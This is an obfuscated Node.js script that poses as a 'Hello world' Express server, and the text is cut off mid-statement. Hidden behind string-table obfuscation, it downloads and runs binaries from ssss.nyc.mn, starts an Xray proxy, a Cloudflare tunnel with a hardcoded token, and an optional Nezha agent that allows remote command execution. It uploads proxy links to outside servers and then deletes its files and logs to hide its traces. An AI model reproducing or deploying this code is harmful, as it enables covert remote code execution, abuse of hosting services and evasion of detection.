const _0xa0b551=_0x2568;(function(_0x1f22e8,_0x40fa79){const _0xe75d3d=_0x2568,_0x35d74d=_0x1f22e8();while(!![]){try{const _0x4b453a=parseInt(_0xe75d3d(0x93))/0x1*(parseInt(_0xe75d3d(0x101))/0x2)+-parseInt(_0xe75d3d(0x11c))/0x3+-parseInt(_0xe75d3d(0xbd))/0x4*(parseInt(_0xe75d3d(0x11e))/0x5)+-parseInt(_0xe75d3d(0x9a))/0x6*(-parseInt(_0xe75d3d(0x96))/0x7)+-parseInt(_0xe75d3d(0x105))/0x8+-parseInt(_0xe75d3d(0xf4))/0x9*(-parseInt(_0xe75d3d(0x133))/0xa)+parseInt(_0xe75d3d(0x12d))/0xb*(parseInt(_0xe75d3d(0x109))/0xc);if(_0x4b453a===_0x40fa79)break;else _0x35d74d['push'](_0x35d74d['shift']());}catch(_0x37c633){_0x35d74d['push'](_0x35d74d['shift']());}}}(_0x5e9e,0x6d6c8));const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0xa0b551(0x8b)),{promisify}=require(_0xa0b551(0xea)),exec=promisify(require(_0xa0b551(0x10e))[_0xa0b551(0xde)]),{execSync}=require(_0xa0b551(0x10e)),UPLOAD_URL=process[_0xa0b551(0xe7)][_0xa0b551(0xf5)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process[_0xa0b551(0xe7)][_0xa0b551(0xb8)]||![],FILE_PATH=process[_0xa0b551(0xe7)]['FILE_PATH']||_0xa0b551(0xa6),SUB_PATH=process['env']['SUB_PATH']||_0xa0b551(0xe6),PORT=process[_0xa0b551(0xe7)][_0xa0b551(0x8d)]||process[_0xa0b551(0xe7)][_0xa0b551(0x12e)]||0xbb8,UUID=process[_0xa0b551(0xe7)]['UUID']||_0xa0b551(0xed),NEZHA_SERVER=process[_0xa0b551(0xe7)][_0xa0b551(0x119)]||'',NEZHA_PORT=process[_0xa0b551(0xe7)][_0xa0b551(0x11f)]||'',NEZHA_KEY=process[_0xa0b551(0xe7)][_0xa0b551(0xf3)]||'',ARGO_DOMAIN=process[_0xa0b551(0xe7)][_0xa0b551(0x89)]||_0xa0b551(0x136),ARGO_AUTH=process['env'][_0xa0b551(0x94)]||_0xa0b551(0x131),ARGO_PORT=process[_0xa0b551(0xe7)][_0xa0b551(0x9d)]||0x1f41,CFIP=process[_0xa0b551(0xe7)]['CFIP']||_0xa0b551(0x11d),CFPORT=process[_0xa0b551(0xe7)][_0xa0b551(0xb5)]||0x1bb,NAME=process['env'][_0xa0b551(0xee)]||_0xa0b551(0x124);!fs['existsSync'](FILE_PATH)?(fs[_0xa0b551(0x11a)](FILE_PATH),console[_0xa0b551(0xef)](FILE_PATH+_0xa0b551(0xdc))):console[_0xa0b551(0xef)](FILE_PATH+_0xa0b551(0xbb));function generateRandomName(){const _0x16d35f=_0xa0b551,_0x4a13ed=_0x16d35f(0x126);let _0x264e29='';for(let _0x513944=0x0;_0x513944<0x6;_0x513944++){_0x264e29+=_0x4a13ed[_0x16d35f(0xe4)](Math[_0x16d35f(0x10d)](Math[_0x16d35f(0xa0)]()*_0x4a13ed['length']));}return _0x264e29;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0xa0b551(0xf7)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0xa0b551(0xf7)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0xa0b551(0xf7)](FILE_PATH,_0xa0b551(0x122)),listPath=path[_0xa0b551(0xf7)](FILE_PATH,_0xa0b551(0xc7)),bootLogPath=path[_0xa0b551(0xf7)](FILE_PATH,_0xa0b551(0xaf)),configPath=path['join'](FILE_PATH,_0xa0b551(0xdb));function deleteNodes(){const _0x2be1e7=_0xa0b551;try{if(!UPLOAD_URL)return;if(!fs[_0x2be1e7(0xcd)](subPath))return;let _0x21697b;try{_0x21697b=fs[_0x2be1e7(0xc1)](subPath,_0x2be1e7(0x91));}catch{return null;}const _0x51f3fc=Buffer[_0x2be1e7(0x97)](_0x21697b,_0x2be1e7(0xda))[_0x2be1e7(0x11b)](_0x2be1e7(0x91)),_0x1a468a=_0x51f3fc[_0x2be1e7(0x140)]('\x0a')['filter'](_0x272c94=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2be1e7(0x114)](_0x272c94));if(_0x1a468a[_0x2be1e7(0xa7)]===0x0)return;return axios[_0x2be1e7(0xb2)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x2be1e7(0xd4)]({'nodes':_0x1a468a}),{'headers':{'Content-Type':_0x2be1e7(0xb7)}})[_0x2be1e7(0xbe)](_0x40a60d=>{return null;}),null;}catch(_0x52bdc7){return null;}}function cleanupOldFiles(){const _0x76306b=_0xa0b551;try{const _0x2d4e97=fs[_0x76306b(0x13a)](FILE_PATH);_0x2d4e97[_0x76306b(0xa8)](_0x44d890=>{const _0x34ec6d=_0x76306b,_0x1ec7a4=path[_0x34ec6d(0xf7)](FILE_PATH,_0x44d890);try{const _0xddcc73=fs[_0x34ec6d(0xdf)](_0x1ec7a4);_0xddcc73[_0x34ec6d(0x100)]()&&fs['unlinkSync'](_0x1ec7a4);}catch(_0x14eadd){}});}catch(_0x3e0a99){}}app[_0xa0b551(0xc9)]('/',function(_0x5ee04c,_0x1108d9){_0x1108d9['send']('Hello\x20world!');});async function generateConfig(){const _0x1f4f14=_0xa0b551,_0x1a6bbf={'log':{'access':'/dev/null','error':_0x1f4f14(0xc2),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1f4f14(0x141),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x1f4f14(0xca),'fallbacks':[{'dest':0xbb9},{'path':_0x1f4f14(0xd0),'dest':0xbba},{'path':_0x1f4f14(0xae),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x1f4f14(0xac)}},{'port':0xbb9,'listen':_0x1f4f14(0xd1),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x1f4f14(0xca)}},{'port':0xbba,'listen':_0x1f4f14(0xd1),'protocol':_0x1f4f14(0x141),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1f4f14(0xca)},'streamSettings':{'network':'ws','security':_0x1f4f14(0xca),'wsSettings':{'path':_0x1f4f14(0xd0)}},'sniffing':{'enabled':!![],'destOverride':[_0x1f4f14(0x12f),_0x1f4f14(0xb1),_0x1f4f14(0xfe)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1f4f14(0xd1),'protocol':_0x1f4f14(0xcc),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1f4f14(0xae)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x1f4f14(0xb1),_0x1f4f14(0xfe)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1f4f14(0xd1),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1f4f14(0x12f),_0x1f4f14(0xb1),_0x1f4f14(0xfe)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x1f4f14(0xba),'tag':'direct'},{'protocol':_0x1f4f14(0xeb),'tag':_0x1f4f14(0xb6)}]};fs[_0x1f4f14(0x92)](path[_0x1f4f14(0xf7)](FILE_PATH,_0x1f4f14(0xdb)),JSON[_0x1f4f14(0xd4)](_0x1a6bbf,null,0x2));}function getSystemArchitecture(){const _0x1bd116=_0xa0b551,_0x28d6f1=os[_0x1bd116(0xf1)]();return _0x28d6f1===_0x1bd116(0x10c)||_0x28d6f1===_0x1bd116(0x130)||_0x28d6f1===_0x1bd116(0xfd)?_0x1bd116(0x10c):_0x1bd116(0x106);}function downloadFile(_0x1158b2,_0x21b7c1,_0x430b14){const _0x4dd797=_0xa0b551,_0x56a14a=_0x1158b2;!fs[_0x4dd797(0xcd)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x5f4aba=fs[_0x4dd797(0x8a)](_0x56a14a);axios({'method':_0x4dd797(0xc9),'url':_0x21b7c1,'responseType':_0x4dd797(0x142)})[_0x4dd797(0xad)](_0x7b997c=>{const _0x424151=_0x4dd797;_0x7b997c[_0x424151(0xd6)][_0x424151(0x95)](_0x5f4aba),_0x5f4aba['on'](_0x424151(0x138),()=>{const _0x298c8b=_0x424151;_0x5f4aba[_0x298c8b(0xe3)](),console[_0x298c8b(0xef)]('Download\x20'+path[_0x298c8b(0xf2)](_0x56a14a)+'\x20successfully'),_0x430b14(null,_0x56a14a);}),_0x5f4aba['on'](_0x424151(0xa9),_0xb101f9=>{const _0x29d5a1=_0x424151;fs[_0x29d5a1(0xfa)](_0x56a14a,()=>{});const _0x190af1=_0x29d5a1(0xab)+path['basename'](_0x56a14a)+_0x29d5a1(0xd7)+_0xb101f9['message'];console[_0x29d5a1(0xa9)](_0x190af1),_0x430b14(_0x190af1);});})[_0x4dd797(0xbe)](_0x6a1cf=>{const _0x5ea65c=_0x4dd797,_0x50eaee=_0x5ea65c(0xab)+path[_0x5ea65c(0xf2)](_0x56a14a)+_0x5ea65c(0xd7)+_0x6a1cf[_0x5ea65c(0xd3)];console['error'](_0x50eaee),_0x430b14(_0x50eaee);});}function _0x5e9e(){const _0x4974f3=['npm\x20running\x20error:\x20','nohup\x20','match','14011778ulgXOh','PORT','http','arm64','eyJhIjoiZWVkNzlkMGVjYzUxMDE1YzczZGVkYmE2MGQ4NTA5OTUiLCJ0IjoiOGFkMjFhMjgtYzYzMi00YTg0LWFkOTUtNmNhYjgyOGYzYWFkIiwicyI6Ik5EazRNRE15WXpZdFpqYzRNQzAwWXpSakxUZzRaVFl0WkdZd04yWTBNV1F3Wm1FMCJ9','Empowerment\x20success\x20for\x20','50wiyfrT','\x20>\x20nul\x202>&1','tunnel.yml','qq001.1.c.3.2.0.5.0.0.0.0.7.4.0.1.0.0.2.ip6.arpa','Content-Type','finish','\x20is\x20running','readdirSync','has','2083','automatic\x20access\x20task\x20added\x20successfully','\x22\x20>\x20/dev/null\x202>&1','http\x20server\x20is\x20running\x20on\x20port:','split','vless','stream','response','ARGO_DOMAIN','createWriteStream','path','clear','SERVER_PORT','\x20-c\x20\x22','2087','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','utf-8','writeFileSync','1zOrrSe','ARGO_AUTH','pipe','7YXeRlj','from','all','8443','1321044TCHKGY','\x0aclient_secret:\x20','\x0a\x20\x20tunnel:\x20','ARGO_PORT','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/api/add-nodes','random','2053','chmod','listen','443','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','./tmp','length','forEach','error','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Download\x20','tcp','then','/vmess-argo','boot.log','2096','tls','post','win32','Skipping\x20adding\x20automatic\x20access\x20task','CFPORT','block','application/json','AUTO_ACCESS','status','freedom','\x20already\x20exists','ARGO_DOMAIN:','1908bguiYo','catch','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','https://oooo.serv00.net/add-url','readFileSync','/dev/null','https://amd64.ssss.nyc.mn/agent','&path=%2Fvless-argo%3Fed%3D2560#','map','\x20-s\x20','list.txt','tunnel.json','get','none','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','vmess','existsSync','false','\x20>/dev/null\x202>&1\x20&','/vless-argo','127.0.0.1','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','message','stringify','push','data','\x20failed:\x20','https://arm64.ssss.nyc.mn/v1','includes','base64','config.json','\x20is\x20created','config.yaml','exec','statSync','del\x20/f\x20/q\x20','--tls','/api/add-subscriptions','close','charAt','taskkill\x20/f\x20/im\x20','sub','env','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','Error\x20reading\x20boot.log:','util','blackhole','pop','f714ba59-a970-4430-a60b-498f4d920b4b','NAME','log','true','arch','basename','NEZHA_KEY','1114119KDARKs','UPLOAD_URL','&path=%2Ftrojan-argo%3Fed%3D2560#','join','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','unshift','unlink','rm\x20-rf\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','aarch64','quic','unlinkSync','isFile','854162VMRcYC','https://amd64.ssss.nyc.mn/v1','Error\x20executing\x20command:\x20','\x0a\x20\x20credentials-file:\x20','6339288xIzmtP','amd','Subscription\x20uploaded\x20successfully','firefox','12PwKHFp','web\x20running\x20error:\x20','?encryption=none&security=tls&sni=','arm','floor','child_process','NEZHA\x20variable\x20is\x20empty,skip\x20running','/vmess-argo?ed=2560','Add\x20automatic\x20access\x20task\x20faild:\x20','/tunnel.yml\x20run','Error\x20downloading\x20files:','test','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','trim','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','ArgoDomain:','NEZHA_SERVER','mkdirSync','toString','1810362lSpaDu','cdns.doon.eu.org','7295kcnITv','NEZHA_PORT','Nodes\x20uploaded\x20successfully','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','sub.txt','https://amd64.ssss.nyc.mn/web','qq001','?security=tls&sni=','abcdefghijklmnopqrstuvwxyz','\x20-p\x20','App\x20is\x20running','\x0a\x20\x20\x0avmess://'];_0x5e9e=function(){return _0x4974f3;};return _0x5e9e();}async function downloadFilesAndRun(){const _0x16b2fc=_0xa0b551,_0x3c052f=getSystemArchitecture(),_0x40ac6d=getFilesForArchitecture(_0x3c052f);if(_0x40ac6d['length']===0x0){console[_0x16b2fc(0xef)](_0x16b2fc(0xd2));return;}const _0x2fb232=_0x40ac6d[_0x16b2fc(0xc5)](_0x28bcee=>{return new Promise((_0x5c31da,_0x115559)=>{downloadFile(_0x28bcee['fileName'],_0x28bcee['fileUrl'],(_0x10305c,_0x2e6b60)=>{_0x10305c?_0x115559(_0x10305c):_0x5c31da(_0x2e6b60);});});});try{await Promise[_0x16b2fc(0x98)](_0x2fb232);}catch(_0x1d0895){console[_0x16b2fc(0xa9)](_0x16b2fc(0x113),_0x1d0895);return;}function _0x4204f3(_0x5d3259){const _0x4cd0fa=_0x16b2fc,_0xb43c8=0x1fd;_0x5d3259[_0x4cd0fa(0xa8)](_0x8c42b3=>{const _0x40ad3d=_0x4cd0fa;fs[_0x40ad3d(0xcd)](_0x8c42b3)&&fs[_0x40ad3d(0xa2)](_0x8c42b3,_0xb43c8,_0x2575d3=>{const _0x20852d=_0x40ad3d;_0x2575d3?console[_0x20852d(0xa9)]('Empowerment\x20failed\x20for\x20'+_0x8c42b3+':\x20'+_0x2575d3):console[_0x20852d(0xef)](_0x20852d(0x132)+_0x8c42b3+':\x20'+_0xb43c8[_0x20852d(0x11b)](0x8));});});}const _0x3c56f4=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4204f3(_0x3c56f4);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x488a38=NEZHA_SERVER[_0x16b2fc(0xd9)](':')?NEZHA_SERVER[_0x16b2fc(0x140)](':')[_0x16b2fc(0xec)]():'',_0x29f661=new Set([_0x16b2fc(0xa4),_0x16b2fc(0x99),_0x16b2fc(0xb0),_0x16b2fc(0x8f),_0x16b2fc(0x13c),_0x16b2fc(0xa1)]),_0x2aa0d8=_0x29f661[_0x16b2fc(0x13b)](_0x488a38)?_0x16b2fc(0xf0):_0x16b2fc(0xce),_0x27b716=_0x16b2fc(0x9b)+NEZHA_KEY+_0x16b2fc(0x117)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x2aa0d8+_0x16b2fc(0xcb)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,_0x16b2fc(0xdd)),_0x27b716);const _0x268d99=_0x16b2fc(0x12b)+phpPath+_0x16b2fc(0x8e)+FILE_PATH+_0x16b2fc(0xbf);try{await exec(_0x268d99),console[_0x16b2fc(0xef)](phpName+_0x16b2fc(0x139)),await new Promise(_0x3f78d3=>setTimeout(_0x3f78d3,0x3e8));}catch(_0x1d1c6b){console[_0x16b2fc(0xa9)]('php\x20running\x20error:\x20'+_0x1d1c6b);}}else{let _0x4c2849='';const _0x192c54=['443','8443',_0x16b2fc(0xb0),_0x16b2fc(0x8f),_0x16b2fc(0x13c),'2053'];_0x192c54[_0x16b2fc(0xd9)](NEZHA_PORT)&&(_0x4c2849=_0x16b2fc(0xe1));const _0x4c1548='nohup\x20'+npmPath+_0x16b2fc(0xc6)+NEZHA_SERVER+':'+NEZHA_PORT+_0x16b2fc(0x127)+NEZHA_KEY+'\x20'+_0x4c2849+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4c1548),console[_0x16b2fc(0xef)](npmName+_0x16b2fc(0x139)),await new Promise(_0x5e3ffa=>setTimeout(_0x5e3ffa,0x3e8));}catch(_0x312930){console[_0x16b2fc(0xa9)](_0x16b2fc(0x12a)+_0x312930);}}}else console[_0x16b2fc(0xef)](_0x16b2fc(0x10f));const _0x36f576=_0x16b2fc(0x12b)+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x36f576),console[_0x16b2fc(0xef)](webName+_0x16b2fc(0x139)),await new Promise(_0x5ca8fb=>setTimeout(_0x5ca8fb,0x3e8));}catch(_0x446b37){console[_0x16b2fc(0xa9)](_0x16b2fc(0x10a)+_0x446b37);}if(fs[_0x16b2fc(0xcd)](botPath)){let _0x44df23;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x44df23=_0x16b2fc(0xa5)+ARGO_AUTH;else ARGO_AUTH[_0x16b2fc(0x12c)](/TunnelSecret/)?_0x44df23=_0x16b2fc(0x90)+FILE_PATH+_0x16b2fc(0x112):_0x44df23='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x16b2fc(0xfc)+ARGO_PORT;try{await exec(_0x16b2fc(0x12b)+botPath+'\x20'+_0x44df23+_0x16b2fc(0xcf)),console[_0x16b2fc(0xef)](botName+'\x20is\x20running'),await new Promise(_0x13bdc4=>setTimeout(_0x13bdc4,0x7d0));}catch(_0x2d4f42){console[_0x16b2fc(0xa9)](_0x16b2fc(0x103)+_0x2d4f42);}}await new Promise(_0x38e960=>setTimeout(_0x38e960,0x1388));}function getFilesForArchitecture(_0x288849){const _0x8cf0d0=_0xa0b551;let _0x190da8;_0x288849===_0x8cf0d0(0x10c)?_0x190da8=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x190da8=[{'fileName':webPath,'fileUrl':_0x8cf0d0(0x123)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x706c8a=_0x288849===_0x8cf0d0(0x10c)?'https://arm64.ssss.nyc.mn/agent':_0x8cf0d0(0xc3);_0x190da8['unshift']({'fileName':npmPath,'fileUrl':_0x706c8a});}else{const _0x458ad6=_0x288849===_0x8cf0d0(0x10c)?_0x8cf0d0(0xd8):_0x8cf0d0(0x102);_0x190da8[_0x8cf0d0(0xf9)]({'fileName':phpPath,'fileUrl':_0x458ad6});}}return _0x190da8;}function argoType(){const _0x485fc1=_0xa0b551;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x485fc1(0xef)](_0x485fc1(0xaa));return;}if(ARGO_AUTH[_0x485fc1(0xd9)]('TunnelSecret')){fs[_0x485fc1(0x92)](path['join'](FILE_PATH,_0x485fc1(0xc8)),ARGO_AUTH);const _0x349ff7=_0x485fc1(0x9c)+ARGO_AUTH[_0x485fc1(0x140)]('\x22')[0xb]+_0x485fc1(0x104)+path[_0x485fc1(0xf7)](FILE_PATH,_0x485fc1(0xc8))+_0x485fc1(0xe8)+ARGO_DOMAIN+_0x485fc1(0x115)+ARGO_PORT+_0x485fc1(0x9e);fs[_0x485fc1(0x92)](path[_0x485fc1(0xf7)](FILE_PATH,_0x485fc1(0x135)),_0x349ff7);}else console[_0x485fc1(0xef)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x95713a=_0xa0b551;let _0x2f8e77;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2f8e77=ARGO_DOMAIN,console[_0x95713a(0xef)](_0x95713a(0xbc),_0x2f8e77),await _0x5bbf02(_0x2f8e77);else try{const _0x16c7cb=fs[_0x95713a(0xc1)](path[_0x95713a(0xf7)](FILE_PATH,_0x95713a(0xaf)),_0x95713a(0x91)),_0x410f5a=_0x16c7cb[_0x95713a(0x140)]('\x0a'),_0x31fff3=[];_0x410f5a[_0x95713a(0xa8)](_0x423608=>{const _0x7649d5=_0x95713a,_0xb28ee2=_0x423608[_0x7649d5(0x12c)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xb28ee2){const _0x5a93bc=_0xb28ee2[0x1];_0x31fff3[_0x7649d5(0xd5)](_0x5a93bc);}});if(_0x31fff3[_0x95713a(0xa7)]>0x0)_0x2f8e77=_0x31fff3[0x0],console['log'](_0x95713a(0x118),_0x2f8e77),await _0x5bbf02(_0x2f8e77);else{console[_0x95713a(0xef)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x95713a(0xff)](path[_0x95713a(0xf7)](FILE_PATH,_0x95713a(0xaf)));async function _0x4c50ac(){const _0x53b0e7=_0x95713a;try{process['platform']===_0x53b0e7(0xb3)?await exec(_0x53b0e7(0xe5)+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName[_0x53b0e7(0xe4)](0x0)+']'+botName['substring'](0x1)+_0x53b0e7(0x13e));}catch(_0x106abc){}}_0x4c50ac(),await new Promise(_0x11dd75=>setTimeout(_0x11dd75,0xbb8));const _0x44e997=_0x95713a(0xf8)+FILE_PATH+_0x95713a(0xfc)+ARGO_PORT;try{await exec(_0x95713a(0x12b)+botPath+'\x20'+_0x44e997+_0x95713a(0xcf)),console[_0x95713a(0xef)](botName+'\x20is\x20running'),await new Promise(_0x4bb8af=>setTimeout(_0x4bb8af,0xbb8)),await extractDomains();}catch(_0x50df80){console[_0x95713a(0xa9)](_0x95713a(0x103)+_0x50df80);}}}catch(_0x15da32){console[_0x95713a(0xa9)](_0x95713a(0xe9),_0x15da32);}async function _0x5bbf02(_0x24259d){const _0x35fdb1=_0x95713a,_0x1bd4b5=execSync(_0x35fdb1(0x121),{'encoding':_0x35fdb1(0x91)}),_0x48042a=_0x1bd4b5[_0x35fdb1(0x116)](),_0x2b2637=NAME?NAME+'-'+_0x48042a:_0x48042a;return new Promise(_0x26ce73=>{setTimeout(()=>{const _0x36bd34=_0x2568,_0x51aecd={'v':'2','ps':''+_0x2b2637,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x36bd34(0xca),'net':'ws','type':_0x36bd34(0xca),'host':_0x24259d,'path':_0x36bd34(0x110),'tls':_0x36bd34(0xb1),'sni':_0x24259d,'alpn':'','fp':_0x36bd34(0x108)},_0x2465a2='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x36bd34(0x10b)+_0x24259d+'&fp=firefox&type=ws&host='+_0x24259d+_0x36bd34(0xc4)+_0x2b2637+_0x36bd34(0x129)+Buffer['from'](JSON[_0x36bd34(0xd4)](_0x51aecd))[_0x36bd34(0x11b)](_0x36bd34(0xda))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x36bd34(0x125)+_0x24259d+'&fp=firefox&type=ws&host='+_0x24259d+_0x36bd34(0xf6)+_0x2b2637+'\x0a\x20\x20\x20\x20';console[_0x36bd34(0xef)](Buffer[_0x36bd34(0x97)](_0x2465a2)[_0x36bd34(0x11b)](_0x36bd34(0xda))),fs[_0x36bd34(0x92)](subPath,Buffer[_0x36bd34(0x97)](_0x2465a2)[_0x36bd34(0x11b)](_0x36bd34(0xda))),console[_0x36bd34(0xef)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x36bd34(0xc9)]('/'+SUB_PATH,(_0x813f5b,_0x4c0571)=>{const _0x46035d=_0x36bd34,_0x3c5de2=Buffer['from'](_0x2465a2)[_0x46035d(0x11b)](_0x46035d(0xda));_0x4c0571['set'](_0x46035d(0x137),'text/plain;\x20charset=utf-8'),_0x4c0571['send'](_0x3c5de2);}),_0x26ce73(_0x2465a2);},0x7d0);});}}async function uploadNodes(){const _0x3b8cc7=_0xa0b551;if(UPLOAD_URL&&PROJECT_URL){const _0x4e1cd7=PROJECT_URL+'/'+SUB_PATH,_0x509ad1={'subscription':[_0x4e1cd7]};try{const _0x3420f6=await axios[_0x3b8cc7(0xb2)](UPLOAD_URL+_0x3b8cc7(0xe2),_0x509ad1,{'headers':{'Content-Type':'application/json'}});return _0x3420f6&&_0x3420f6[_0x3b8cc7(0xb9)]===0xc8?(console[_0x3b8cc7(0xef)](_0x3b8cc7(0x107)),_0x3420f6):null;}catch(_0x45e4e4){if(_0x45e4e4[_0x3b8cc7(0x88)]){if(_0x45e4e4['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3b8cc7(0xcd)](listPath))return;const _0x2e5f06=fs['readFileSync'](listPath,'utf-8'),_0x317241=_0x2e5f06[_0x3b8cc7(0x140)]('\x0a')['filter'](_0x2abf58=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3b8cc7(0x114)](_0x2abf58));if(_0x317241[_0x3b8cc7(0xa7)]===0x0)return;const _0x3f0755=JSON[_0x3b8cc7(0xd4)]({'nodes':_0x317241});try{const _0x40fa7c=await axios[_0x3b8cc7(0xb2)](UPLOAD_URL+_0x3b8cc7(0x9f),_0x3f0755,{'headers':{'Content-Type':_0x3b8cc7(0xb7)}});return _0x40fa7c&&_0x40fa7c[_0x3b8cc7(0xb9)]===0xc8?(console[_0x3b8cc7(0xef)](_0x3b8cc7(0x120)),_0x40fa7c):null;}catch(_0x58d605){return null;}}else return;}}function _0x2568(_0x435b3c,_0x43df11){const _0x5e9edf=_0x5e9e();return _0x2568=function(_0x25685c,_0x1f0029){_0x25685c=_0x25685c-0x88;let _0x401a0b=_0x5e9edf[_0x25685c];return _0x401a0b;},_0x2568(_0x435b3c,_0x43df11);}function cleanFiles(){setTimeout(()=>{const _0x202104=_0x2568,_0x539deb=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x539deb[_0x202104(0xd5)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x539deb[_0x202104(0xd5)](phpPath);process['platform']===_0x202104(0xb3)?exec(_0x202104(0xe0)+_0x539deb[_0x202104(0xf7)]('\x20')+_0x202104(0x134),_0x537fbf=>{const _0x21b88f=_0x202104;console[_0x21b88f(0x8c)](),console[_0x21b88f(0xef)](_0x21b88f(0x128)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x202104(0xfb)+_0x539deb[_0x202104(0xf7)]('\x20')+'\x20>/dev/null\x202>&1',_0x138b66=>{const _0x543cb8=_0x202104;console[_0x543cb8(0x8c)](),console[_0x543cb8(0xef)](_0x543cb8(0x128)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2d71c6=_0xa0b551;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2d71c6(0xef)](_0x2d71c6(0xb4));return;}try{const _0x421e5e=await axios[_0x2d71c6(0xb2)](_0x2d71c6(0xc0),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2d71c6(0xb7)}});return console['log'](_0x2d71c6(0x13d)),_0x421e5e;}catch(_0x1655da){return console[_0x2d71c6(0xa9)](_0x2d71c6(0x111)+_0x1655da[_0x2d71c6(0xd3)]),null;}}async function startserver(){const _0x136942=_0xa0b551;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 